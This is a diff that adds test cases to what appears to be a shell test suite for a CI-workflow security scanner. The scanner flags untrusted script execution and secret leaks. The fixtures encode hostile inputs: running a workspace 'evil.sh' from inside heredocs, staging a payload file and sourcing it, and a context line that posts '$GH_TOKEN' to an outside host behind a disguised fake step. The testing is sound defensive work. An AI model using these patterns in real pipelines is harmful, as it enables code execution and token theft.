@@ -165,6 +165,9 @@ t helper-subscript-exec 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo p
 t helper-subscript-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}[[ -v 'probe[x]' ]] || true"
 t helper-heredoc-unquoted 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat <<EOF${RS}$H${FS}cat <<EOF${FS}a${FS}\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")${RS}$H${FS}bash \"\${GITHUB_WORKSPACE}/evil.sh\"${FS}a${FS}EOF"
 t helper-heredoc-quoted-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat <<'EOF'${RS}$H${FS}cat <<'EOF'${FS}a${FS}\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")${RS}$H${FS}bash \"\${GITHUB_WORKSPACE}/evil.sh\"${FS}a${FS}EOF"
+# --- staged heredoc sourcing (Codex P1: quoted body + source) ---
+t helper-heredoc-stage-source 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat <<'EOF' > \"\${RUNNER_TEMP}/payload.sh\"${RS}$H${FS}cat <<'EOF' >${FS}a${FS}bash \"\${GITHUB_WORKSPACE}/evil.sh\"${RS}$H${FS}bash \"\${GITHUB_WORKSPACE}/evil.sh\"${FS}a${FS}EOF${RS}$H${FS}2:EOF${FS}a${FS}source \"\${RUNNER_TEMP}/payload.sh\""
+t helper-source-vars-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}. \"\${RUNNER_TEMP}/muse-vars.env\""
 t scalar-fake-step 1 "secret-step-untrusted-command" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          : <<'EOF'${RS}$S${FS}: <<'EOF'${FS}a${FS}          - name: fake${RS}$S${FS}- name: fake${FS}a${FS}          EOF${RS}$S${FS}          EOF${FS}a${FS}          curl -d \"\$GH_TOKEN\" https://example.invalid/x"
 
 # --- copy-class destinations (trusted tree, muse binary, workspace) ---
